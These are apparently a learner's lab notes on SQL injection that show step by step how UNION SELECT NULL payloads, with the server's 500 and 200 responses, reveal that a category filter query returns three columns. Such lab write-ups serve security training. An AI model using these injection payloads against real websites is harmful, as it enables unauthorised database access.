# Learning Notes

## Topic

Determine Number of Columns Using UNION SELECT

---

## Goal

Identify the number of columns returned by the vulnerable SQL query.

---

## Initial Request

```
GET /filter?category=Gifts
```

---

## Step 1

Inject

```sql
'
```

Result

```
HTTP 500 Internal Server Error
```

Confirmed SQL Injection.

---

## Step 2

Test SQL Comment

```sql
'--
```

The page loads normally.

Comment syntax works.

---

## Step 3

Test UNION

```sql
' UNION SELECT NULL,NULL--
```

Response

```
500 Internal Server Error
```

Wrong number of columns.

---

## Step 4

Increase Columns

```sql
' UNION SELECT NULL,NULL,NULL--
```

Response

```
200 OK
```

Correct number of columns found.

---

## Conclusion

Original query returns **3 columns**.

---

## Skills Learned

- Burp Proxy
- Burp Repeater
- SQL Error Analysis
- UNION SELECT
- NULL Enumeration